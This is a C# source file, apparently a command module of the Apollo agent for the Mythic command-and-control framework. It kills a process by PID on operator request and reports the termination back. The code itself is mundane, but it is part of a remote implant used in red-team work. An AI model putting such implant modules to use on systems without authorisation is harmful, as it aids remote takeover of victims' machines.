#define COMMAND_NAME_UPPER

#if DEBUG
#undef KILL
#define KILL
#endif

#if KILL
using System;
using System.Diagnostics;
using Apollo.Jobs;
using Apollo.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Apollo.CommandModules
{
    public struct KillParameters
    {
        public int pid;
    }
    public class Kill
    {
        /// <summary>
        /// Kill a process with a given PID.
        /// </summary>
        /// <param name="job">
        /// Job associated with this task. The process to kill
        /// is located in job.Task.parameters and should be a
        /// valid unsigned 32-bit integer.
        /// </param>
        /// <param name="agent">Agent to run this command on.</param>
        public static void Execute(Job job, Agent agent)
        {
            Task task = job.Task;
            KillParameters args = JsonConvert.DeserializeObject<KillParameters>(task.parameters);
            int pid = args.pid;
            try
            {
                System.Diagnostics.Process target = System.Diagnostics.Process.GetProcessById(pid);
                target.Kill();
                ApolloTaskResponse resp = new ApolloTaskResponse(job.Task, $"Killed process with PID {pid}")
                {
                    artifacts = new Mythic.Structs.Artifact[]
                    {
                        new Mythic.Structs.Artifact(){ base_artifact = "Process Terminated", artifact = $"{target.ProcessName} (PID: {pid})"}
                    }
                };
                job.SetComplete(resp);
            }
            catch (Exception e)
            {
                job.SetError(String.Format("Error killing process with PID {0}. Reason: {1}", pid, e.Message));
            }
        }
    }
}
#endif